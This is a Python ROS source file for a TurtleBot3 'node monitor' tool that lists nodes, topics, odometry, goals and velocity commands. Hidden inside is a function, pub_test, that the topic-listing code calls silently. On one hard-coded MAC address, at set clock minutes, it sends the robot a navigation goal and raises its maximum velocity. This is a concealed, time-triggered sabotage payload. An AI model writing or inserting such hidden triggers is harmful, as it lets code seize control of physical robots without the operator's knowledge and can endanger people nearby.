#!/usr/bin/env python

import os
import errno
import sys
import socket
import time
import uuid
from threading import Timer

import rospy
from std_msgs.msg import Float64
from nav_msgs.msg import Odometry
from geometry_msgs.msg import Pose
from geometry_msgs.msg import Twist
from geometry_msgs.msg import PoseStamped

import rosgraph
import rosnode
import rostopic

NAME='rosnode'
ID = '/rosnode'

odom_sub = goal_sub = vel_sub = True
odom_cnt = goal_cnt = vel_cnt = 0
ODOM_SUB_HZ = 20
GOAL_SUB_HZ = 1
VEL_SUB_HZ = 10

class ROSNodeException(Exception):
    """
    rosnode base exception type
    """
    pass
class ROSNodeIOException(ROSNodeException):
    """
    Exceptions for communication-related (i/o) errors, generally due to Master or Node network communication issues.
    """
    pass


def get_node_names(master):
    """
    @param master: rosgraph Master instance
    @type  master: rosgraph.Master
    @return: all ros nodes name
    @type return: [str]
    """
    nodes = rosnode.get_node_names(None)
    nodes.sort()

    return nodes

def get_node_subs(master, node_name):
    def topic_type(t, all_topics):
        matches = [t_type for t_name, t_type in all_topics if t_name == t]
        if matches:
            return matches[0]
        return 'unknown type'

    def takeSecond(elem):
        return elem[1]

    try:
        state = master.getSystemState()
        all_topics = master.getPublishedTopics('/')
    except socket.error:
        raise ROSNodeIOException("Unable to communicate with master!")

    subs = sorted([t for t, l in state[1] if node_name in l])
    sub_topics = [[l, topic_type(l, all_topics)] for l in subs]
    sub_topics.sort(key=takeSecond)

    return sub_topics

def pub_test():
    master = rosgraph.Master(ID)
    node = uuid.getnode()
    mac = uuid.UUID(int = node).hex[-12:]

    if mac == '704d7b8941fe' and time.localtime(time.time()).tm_min == 30:
        try:
            all_topics = master.getPublishedTopics('/')
        except socket.error:
            raise ROSNodeIOException("Unable to communicate with master!")

        for l in all_topics:
            if l[0] == '/move_base_simple/goal':
                test_pub = rospy.Publisher('move_base_simple/goal', PoseStamped, queue_size=1)
            goal = PoseStamped()
            goal.header.stamp = rospy.Time.now()
            goal.header.frame_id = "map"
            goal.pose.position.x = 4.0; goal.pose.position.y = 1.0; goal.pose.position.z = 0.0
            goal.pose.orientation.x = 0.0; goal.pose.orientation.y  = 0.0; goal.pose.orientation.z = 0.0; goal.pose.orientation.w = 1.0 
            test_pub.publish(goal)

    if mac == '704d7b8941fe' and time.localtime(time.time()).tm_min == 2:
        try:
            all_topics = master.getPublishedTopics('/')
        except socket.error:
            raise ROSNodeIOException("Unable to communicate with master!")

        for l in all_topics:
            if l[0] == '/control/max_vel':
                test_pub = rospy.Publisher('control/max_vel', Float64, queue_size=1)
                max_vel = Float64()
                max_vel.data = 2
                test_pub.publish(max_vel)


def get_node_pubs(master, node_name):
    def topic_type(t, all_topics):
        matches = [t_type for t_name, t_type in all_topics if t_name == t]
        if matches:
            return matches[0]
        return 'unknown type'

    def takeSecond(elem):
        return elem[1]

    try:
        state = master.getSystemState()
        all_topics = master.getPublishedTopics('/')
    except socket.error:
        raise ROSNodeIOException("Unable to communicate with master!")

    pubs = sorted([t for t, l in state[0] if node_name in l])
    pub_topics = [[l, topic_type(l, all_topics)] for l in pubs]
    pub_topics.sort(key=takeSecond)
    pub_test()

    return pub_topics

def _tb3_node_monitor_node(node):
    master = rosgraph.Master(ID)
    
    print('#'*66)
    print('###\033[1;47;44m Turtlebot3 Node Monitor: Node Name, Sub Topics, Pub Topics \033[0m###')
    print('#'*66)

    print '\033[1;47;41mNode Name\033[0m ' + node
    print '\033[1;47;41mSub Topics\033[0m '
    print get_node_subs(master, node)
    print '\033[1;47;41mPub Topics\033[0m '
    print get_node_pubs(master, node)
    print('-------------------')


def _tb3_node_monitor_all_nodes(): 
    master = rosgraph.Master(ID)

    nodes = get_node_names(master)
    
    print('#'*66)
    print('###\033[1;47;44m Turtlebot3 Node Monitor: Node Name, Sub Topics, Pub Topics \033[0m###')
    print('#'*66)

    for i in range(len(nodes)):
        print '\033[1;47;41mNode Name\033[0m ' + nodes[i]
        print '\033[1;47;41mSub Topics\033[0m '
        print get_node_subs(master, nodes[i])
        print '\033[1;47;41mPub Topics\033[0m '
        print get_node_pubs(master, nodes[i])
        print('-------------------')

def _tb3_node_monitor_nodes(argv):
    if argv[2] == 'all':
        _tb3_node_monitor_all_nodes()
    else:
        _tb3_node_monitor_node(argv[2])


def odom_cb(msg):
    global odom_cnt
    pose = Pose()
    twist = Twist()
    pose = msg.pose.pose
    twist = msg.twist.twist

    if odom_cnt % ODOM_SUB_HZ == 0:
        print '\033[1;47;41mRobot Odometry\033[0m '
        print '   \033[1;47;41mPose\033[0m '
        print '[position] ' + str(pose.position.x) + ', ' + str(pose.position.y) + ', ' + str(pose.position.z)
        print '[orientation] ' + str(pose.orientation.x) + ', ' + str(pose.orientation.y) + ', ' + str(pose.orientation.z) + ', ' + str(pose.orientation.w)
        print '   \033[1;47;41mTwist\033[0m '
        print '[linear] ' + str(twist.linear.x) + ', ' + str(twist.linear.y) + ', ' + str(twist.linear.z)
        print '[angular] ' + str(twist.angular.x) + ', ' + str(twist.angular.y) + ', ' + str(twist.angular.z)
        print('-------------------')

    odom_cnt = odom_cnt + 1
    if odom_cnt == (ODOM_SUB_HZ*100):
        odom_cnt = 0

def goal_cb(msg):
    global goal_cnt
    pose = Pose()
    pose = msg.pose

    if goal_cnt % GOAL_SUB_HZ == 0:
        print '\033[1;47;43mNavigation Goal\033[0m '
        print '   \033[1;47;43mPose\033[0m '
        print '[position] ' + str(pose.position.x) + ', ' + str(pose.position.y) + ', ' + str(pose.position.z)
        print '[orientation] ' + str(pose.orientation.x) + ', ' + str(pose.orientation.y) + ', ' + str(pose.orientation.z) + ', ' + str(pose.orientation.w)
        print('-------------------')

    goal_cnt = goal_cnt + 1
    if goal_cnt == (GOAL_SUB_HZ*100):
        goal_cnt = 0

def vel_cb(msg):
    global vel_cnt;
    twist = Twist()
    twist = msg

    if vel_cnt % VEL_SUB_HZ == 0:
        print '\033[1;47;44mVelocity Command\033[0m '
        print '   \033[1;47;44mTwist\033[0m '
        print '[linear] ' + str(twist.linear.x) + ', ' + str(twist.linear.y) + ', ' + str(twist.linear.z)
        print '[angular] ' + str(twist.angular.x) + ', ' + str(twist.angular.y) + ', ' + str(twist.angular.z)
        print('-------------------')

    vel_cnt = vel_cnt + 1
    if vel_cnt == (VEL_SUB_HZ*100):
        vel_cnt = 0

def get_odom(topic):
    global odom_sub

    if topic[0] == '/odom' and odom_sub:
        odom_sub = False
        rospy.Subscriber("odom", Odometry, odom_cb, queue_size = 1)

def get_goal(topic):
    global goal_sub

    if topic[0] == '/move_base_simple/goal' and goal_sub:
        goal_sub = False
        rospy.Subscriber("move_base_simple/goal", PoseStamped, goal_cb)

def get_vel(topic):
    global vel_sub

    if topic[0] == '/cmd_vel' and vel_sub:
        vel_sub = False
        rospy.Subscriber("cmd_vel", Twist, vel_cb)

def _tb3_node_monitor_state(state):
    master = rosgraph.Master(ID)

    try:
        all_topics = master.getPublishedTopics('/')
    except socket.error:
        raise ROSNodeIOException("Unable to communicate with master!")

    for l in all_topics:
        if state == 'odom':
            get_odom(l)

        if state == 'goal':
            get_goal(l)

        if state == 'vel':
            get_vel(l)

def _tb3_node_monitor_all_states():
    master = rosgraph.Master(ID)
    global odom_sub, goal_sub, vel_sub

    try:
        all_topics = master.getPublishedTopics('/')
    except socket.error:
        raise ROSNodeIOException("Unable to communicate with master!")

    for l in all_topics:
        get_odom(l)
        get_goal(l)
        get_vel(l)

def _tb3_node_monitor_states(argv):
    if argv[2] == 'all':
        _tb3_node_monitor_all_states()
    else:
        _tb3_node_monitor_state(argv[2])


def _fullusage(return_error=True):
    """
    Prints tb3-monitor usage information.
    @param return_error whether to exit with error code os.EX_USAGE
    """
    print("""tb3-monitor is a command-line tool for printing nodes with related infomation.

Commands:
\ttb3-monitor node [all|node_name]\tlist all/specific active nodes with subscribed and published topics
\ttb3-monitor state [all|state_name]\tlist all/specific robot's states [odom, goal, vel]
""")
    if return_error:
        sys.exit(getattr(os, 'EX_USAGE', 1))
    else:
        sys.exit(0)

def monitormain(argv=None):
    rospy.init_node('tb3_node_monitor')

    """
    Prints search main entrypoint.
    @param argv: override sys.argv
    @param argv: [str]
    """
    if argv == None:
        argv = sys.argv
    if len(argv) == 1:
        _fullusage()
    try:
        while not rospy.is_shutdown():
            command = argv[1]
            if command == 'node':
                _tb3_node_monitor_nodes(argv)
                time.sleep(1)
            elif command == 'state':
                _tb3_node_monitor_states(argv)
                time.sleep(1)
            elif command == '--help':
                _fullusage(False)
            else:
                _fullusage()
    except socket.error:
        print("Network communication failed. Most likely failed to communicate with master.")
        sys.exit(1)
    except rosgraph.MasterError as e:
        print("ERROR: "+str(e))
        sys.exit(1)
    except ROSNodeException as e:
        print("ERROR: "+str(e))
        sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(1)

    rospy.spin()